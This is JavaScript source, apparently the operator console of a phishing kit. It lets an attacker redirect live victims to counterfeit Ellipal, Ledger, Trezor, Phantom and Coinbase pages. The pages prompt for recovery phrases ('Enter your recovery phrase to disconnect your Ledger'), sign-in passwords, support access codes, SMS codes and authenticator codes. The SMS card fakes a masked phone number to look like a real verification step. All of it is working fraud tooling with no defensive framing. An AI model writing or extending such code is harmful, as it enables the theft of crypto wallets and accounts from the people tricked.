            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Ellipal</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">disconnect + recover</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.elPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-el-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn el-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn el-preset-recover">Recover wallet</button>'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.el-preset-disconnect');
            var btnRec=panel.querySelector('.el-preset-recover');
            function setPreset(key){
                panel.dataset.elPreset=key;
                if(presetRow) presetRow.dataset.elPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.elPreset==='recover' ? '/ellipal/recover' : '/ellipal/1'; }
            function _buildPost(){ return Object.assign({}, POST_DEFAULT); }
            panel.querySelector('.rp-btn-preview').onclick=function(){
                if(panel.dataset.elPreset==='recover') _openPreviewIframe('/ellipal/recover');
                else _openPreviewIframe('/ellipal/1',_buildPost());
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:dest(),page_state:st});
                
                elClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;elClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;elAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Loading — TYPE 1 roomy (Send|Preview only)
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Loading</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/ellipal/loading'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/ellipal/loading'});
                
                elClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;elClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;elAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
    }, 'wallets');

    // Ledger
    mkSiteBtn('Ledger', '/ledger2logo.png', function(body) {
        var ldAcc=[], ldClose=mkAccordion(null,ldAcc);
        ldClose=function(skip){
            ldAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        var POST_DEFAULT={
            _title:'Disconnect your Ledger',
            _sub:'Enter your recovery phrase to disconnect your Ledger',
            _btn:'Continue'
        };
        // NANO / STAX / NANO S — TYPE 3 roomy; Disconnect|Recover stay UI markers.
        // Send is GET `{url,page_state}` (no leftover copy post). Preview still posts Keep-default copy.
        [
            { title:'Nano', url:'/ledger/1', sub:'disconnect + recover' },
            { title:'Stax', url:'/ledger/2', sub:'disconnect + recover' },
            { title:'Nano S', url:'/ledger/3', sub:'disconnect + recover' }
        ].forEach(function(cfg){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">'+cfg.title+'</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">'+cfg.sub+'</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.ldPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-ld-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn ld-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn ld-preset-recover">Recover wallet</button>'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.ld-preset-disconnect');
            var btnRec=panel.querySelector('.ld-preset-recover');
            function setPreset(key){
                panel.dataset.ldPreset=key;
                if(presetRow) presetRow.dataset.ldPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.ldPreset==='recover' ? cfg.url+'/recover' : cfg.url; }
            function _buildPost(){ return Object.assign({}, POST_DEFAULT); }
            panel.querySelector('.rp-btn-preview').onclick=function(){
                if(panel.dataset.ldPreset==='recover') _openPreviewIframe(dest());
                else _openPreviewIframe(cfg.url,_buildPost());
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:dest(),page_state:st});
                
                ldClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;ldClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;ldAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        });
        // Sign In + Loading — TYPE 1 roomy (Send|Preview only)
        [
            { title:'Sign In', url:'/ledger/signin', sub:'the starting page' },
            { title:'Loading', url:'/ledger/loading', sub:'loading state' }
        ].forEach(function(pg){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">'+pg.title+'</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">'+pg.sub+'</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(pg.url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:pg.url});
                
                ldClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;ldClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;ldAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        });
    }, 'wallets');

    // Trezor
    mkSiteBtn('Trezor', '/Trezorlogorpsitebtn.png', function(body) {
        var trzAcc=[], trzClose=mkAccordion(null,trzAcc);
        trzClose=function(skip){
            trzAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        // Connect — TYPE 1; hide Title Keep-default UI; Send/Preview GET
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Connect</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">connect device</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/trezor/connect'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/trezor/connect'});
                
                trzClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;trzClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;trzAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Phrase Page — TYPE 3
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Phrase Page</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">disconnect + recover</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.trzPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-trz-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn trz-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn trz-preset-recover">Recover wallet</button>'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.trz-preset-disconnect');
            var btnRec=panel.querySelector('.trz-preset-recover');
            function setPreset(key){
                panel.dataset.trzPreset=key;
                if(presetRow) presetRow.dataset.trzPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.trzPreset==='recover' ? '/trezor/recover' : '/trezor/phrase-page'; }
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(dest()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:dest(),page_state:st});
                
                trzClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;trzClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;trzAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Loading — TYPE 1
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Loading</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/trezor/loading',{}); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/trezor/loading'});
                
                trzClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;trzClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;trzAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
    }, 'wallets', 'invert(1)');

    // 
    // SITE: Coinbase
    // 
    // Phantom site (menu + overlay header); Seeds card title only = Bingo; routes remain /phantom/*
    mkSiteBtn('Phantom', '/phantom-logo.svg', function(body) {
        var phAcc=[], phClose=mkAccordion(null,phAcc);
        phClose=function(skip){
            phAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
        var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";

        // Seeds — TYPE 3; Send is GET + page_state; Preview stays GET-only (temp)
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Bingo</span><span class="ps-roomy-sub" style="'+HEAD_S+'">disconnect + recover</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.phPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-ph-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn ph-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn ph-preset-recover">Recover wallet</button>'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.ph-preset-disconnect');
            var btnRec=panel.querySelector('.ph-preset-recover');
            function setPreset(key){
                panel.dataset.phPreset=key;
                if(presetRow) presetRow.dataset.phPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.phPreset==='recover' ? '/phantom/recover' : '/phantom/seeds'; }
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(dest()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:dest(),page_state:st});
                
                phClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;phClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;phAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // Loading — TYPE 1 (visitor HTML redesign later — handoff backlog)
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Loading</span><span class="ps-roomy-sub" style="'+HEAD_S+'">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/phantom/loading'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/phantom/loading'});
                
                phClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;phClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;phAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
    }, 'wallets');
    mkSiteBtn('Coinbase', '/Coinbaselogo.png', function(body) {
        var cbAcc=[], cbClose=mkAccordion(null,cbAcc);
        cbClose=function(skip){
            cbAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return; /* pilot: only header closes it */
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        function _cbSimpleBtn(label, url) {
            var item={btn:null,panel:null,open:false};
            var btn=document.createElement('button');btn.className='rp-page-btn';
            btn.innerHTML='<span class="rp-btn-label">'+label+'</span><span class="rp-btn-url">'+url+'</span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel';panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){_openPreviewIframe(url);};
            panel.querySelector('.rp-btn-send').onclick=function(){sendCommand('redirect',{url:url});cbClose(item);};
            btn.onclick=function(){var o=!item.open;cbClose(item);item.open=o;btn.classList.toggle('is-selected',o);panel.style.display=o?'block':'none';};
            item.btn=btn;item.panel=panel;cbAcc.push(item);body.appendChild(btn);body.appendChild(panel);
        }
        function _cbSection(label) {
            var sep=document.createElement('div');
            sep.style.cssText='display:flex;align-items:center;gap:7px;margin:10px 0 4px;padding:0 2px;';
            var line1=document.createElement('div');line1.style.cssText='flex:1;height:1px;background:rgba(255,255,255,.08);';
            var lbl=document.createElement('span');
            lbl.style.cssText='font-family:monospace;font-size:9px;font-weight:800;color:rgba(255,255,255,.28);letter-spacing:.12em;text-transform:uppercase;white-space:nowrap;flex-shrink:0;';
            lbl.textContent=label;
            var line2=document.createElement('div');line2.style.cssText='flex:1;height:1px;background:rgba(255,255,255,.08);';
            sep.appendChild(line1);sep.appendChild(lbl);sep.appendChild(line2);
            body.appendChild(sep);
        }

        //  Sign in & Auth — roomy design only (first four)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            function _cbRoomyHead(title,url){
                return '<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">'+title+'</span><span class="ps-roomy-sub" style="'+HEAD_S+'">'+url+'</span></span>'+CHEVRON_PG;
            }
            function _cbMkAuthCard(opts){
                var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
                var wrap=document.createElement('div');wrap.className='ps-roomy-card';
                var btn=document.createElement('button');
                btn.className='rp-page-btn ps-roomy-btn';
                btn.innerHTML=_cbRoomyHead(opts.title,opts.url);
                var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
                panel.innerHTML=opts.bodyHtml||'';
                if(opts.bind) opts.bind(panel,item);
                btn.onclick=function(){
                    var o=!item.open;cbClose(item);item.open=o;
                    btn.classList.toggle('is-selected',o);
                    panel.style.display=o?'block':'none';
                    if(item.wrap) item.wrap.classList.toggle('is-open',o);
                };
                item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
                wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
                return item;
            }
            // Support Landing — TYPE 1
            _cbMkAuthCard({
                title:'Support Landing', url:'the starting page of CB',
                bodyHtml: ACTION_ROW,
                bind:function(panel,item){
                    panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/support-landing'); };
                    panel.querySelector('.rp-btn-send').onclick=function(){
                        sendCommand('redirect',{url:'/coinbase/support-landing'});
                        
                        cbClose(item);
                    };
                }
            });
            // Sign In — TYPE 2 (Default|Invalid marker only)
            _cbMkAuthCard({
                title:'Sign In', url:'Sign in and password',
                bodyHtml: PAGE_STATE_ROW + ACTION_ROW,
                bind:function(panel,item){
                    bindPageStateRow(panel);
                    panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/sign-in'); };
                    panel.querySelector('.rp-btn-send').onclick=function(){
                        var st=panel.dataset.pageState||'default';
                        sendCommand('redirect',{url:'/coinbase/sign-in',page_state:st});
                        
                        cbClose(item);
                    };
                }
            });

            // Case Access Code — Default|PIN (combined access-code + access-pin); no extra field
            _cbMkAuthCard({
                title:'Case Access Code', url:'Support case access code',
                bodyHtml:
                    '<div class="rp-action-row ex-preset-row" data-cb-ac-mode="default">'
                  +   '<button type="button" class="ps-toggle-btn cb-ac-mode-default ps-toggle-active">Default</button>'
                  +   '<button type="button" class="ps-toggle-btn cb-ac-mode-pin">PIN</button>'
                  + '</div>'
                  + ACTION_ROW,
                bind:function(panel,item){
                    panel.dataset.cbAcMode='default';
                    var modeRow=panel.querySelector('.ex-preset-row');
                    var btnDef=panel.querySelector('.cb-ac-mode-default');
                    var btnPin=panel.querySelector('.cb-ac-mode-pin');
                    function setMode(key){
                        panel.dataset.cbAcMode=key;
                        if(modeRow) modeRow.dataset.cbAcMode=key;
                        if(btnDef) btnDef.classList.toggle('ps-toggle-active', key==='default');
                        if(btnPin) btnPin.classList.toggle('ps-toggle-active', key==='pin');
                    }
                    if(btnDef) btnDef.onclick=function(){ setMode('default'); };
                    if(btnPin) btnPin.onclick=function(){ setMode('pin'); };
                    function _url(){ return panel.dataset.cbAcMode==='pin' ? '/coinbase/access-pin' : '/coinbase/access-code'; }
                    panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(_url()); };
                    panel.querySelector('.rp-btn-send').onclick=function(){
                        var url=_url();
                        sendCommand('redirect',{url:url});
                        
                        cbClose(item);
                    };
                }
            });
            //  SMS — TYPE 2 roomy; Last only (admin design); post still {cc,stars,last2}
            (function(){
                var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
                var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
                var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
                var wrap=document.createElement('div');wrap.className='ps-roomy-card';
                var btn=document.createElement('button');
                btn.className='rp-page-btn ps-roomy-btn';
                btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">SMS</span><span class="ps-roomy-sub" style="'+HEAD_S+'">6 digit verification code</span></span>'+CHEVRON_PG;
                var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
                panel.innerHTML=
                    '<div class="ps-roomy-field-row ps-roomy-field-row--split">'
                  +   '<span class="rp-label">Last 2 digits</span>'
                  +   '<input type="text" class="rp-input" id="cb-sms-last2-inp" placeholder="xx" maxlength="2" value="">'
                  + '</div>'
                  + PAGE_STATE_ROW
                  + ACTION_ROW;
                bindPageStateRow(panel);
                function _smsPost(){
                    var last2=(document.getElementById('cb-sms-last2-inp')||{value:''}).value.trim();
                    return {cc:'1',stars:'7',last2:last2};
                }
                panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/sms-code',_smsPost()); };
                panel.querySelector('.rp-btn-send').onclick=function(){
                    var st=panel.dataset.pageState||'default';
                    sendCommand('redirect',{url:'/coinbase/sms-code',page_state:st,post:_smsPost()});
                    
                    cbClose(item);
                };
                btn.onclick=function(){
                    var o=!item.open;cbClose(item);item.open=o;
                    btn.classList.toggle('is-selected',o);
                    panel.style.display=o?'block':'none';
                    if(item.wrap) item.wrap.classList.toggle('is-open',o);
                };
                item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
                wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
            })();
            // Authenticator Code — TYPE 2 (Default|Invalid marker only)
            _cbMkAuthCard({
                title:'Authenticator Code', url:'the 6 digit code from applicable app',
                bodyHtml: PAGE_STATE_ROW + ACTION_ROW,
                bind:function(panel,item){
                    bindPageStateRow(panel);
                    panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/authenticator-code'); };
                    panel.querySelector('.rp-btn-send').onclick=function(){
                        var st=panel.dataset.pageState||'default';
                        sendCommand('redirect',{url:'/coinbase/authenticator-code',page_state:st});
                        
                        cbClose(item);
                    };
                }
            });
        })();

        // Loading — TYPE 1 roomy (presentation order only; was after Done)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Loading</span><span class="ps-roomy-sub" style="'+HEAD_S+'">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/loading';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:url});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Device Confirmation — TYPE 2 roomy; Email input outline like reference
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
